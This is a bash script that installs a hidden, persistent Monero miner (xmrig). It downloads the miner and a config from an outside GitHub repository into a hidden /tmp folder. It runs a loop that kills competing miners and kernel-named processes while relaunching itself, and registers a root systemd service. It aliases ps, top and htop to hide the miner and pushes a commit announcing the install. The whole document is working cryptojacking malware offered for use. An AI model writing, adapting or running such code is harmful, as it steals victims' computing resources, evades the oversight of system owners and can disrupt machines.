#!/bin/bash

repo="https://github.com/gorguzaaaaz/texniaz"
folder="/tmp/.texniaz"
xmrver="6.22.2"

# Create hidden folder
mkdir -p $folder
cd $folder

# Download xmrig
wget https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz

tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
cd xmrig-$xmrver
chmod +x xmrig

# Download Config.json
wget $repo/raw/main/config.json

# Process Killer
cat <<EOF > killer.sh
#!/bin/bash
while true; do
  pkill -f xmrig
  pkill -f minerd
  pkill -f kworker
  pkill -f kthreadd
  echo "texniaz" > /proc/\$$/comm
  if ! pgrep -f xmrig; then
    nohup $folder/xmrig-$xmrver/xmrig > /dev/null 2>&1 &
  fi
  sleep 10
done
EOF

chmod +x killer.sh

# Systemd Service
cat <<EOL > /etc/systemd/system/texniaz.service
[Unit]
Description=Texniaz Miner Service
After=network.target

[Service]
ExecStart=$folder/killer.sh
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
EOL

# Enable & Start Service
systemctl daemon-reload
systemctl enable texniaz
systemctl start texniaz

# Hide the Process
alias ps='echo Sorry, No Miners Here 💀'
alias top='echo Sorry, No Miners Here 💀'
alias htop='echo Sorry, No Miners Here 💀'

# Self Upload to GitHub
git clone $repo
cd texniaz
echo "Texniaz Miner Installed" > payload.txt
git add payload.txt
git commit -m "Add Texniaz Auto Miner 💀"
git push origin main

clear
echo "PHONK BY TEXNIAZ 🔥💀 - Unkillable Miner Installed"
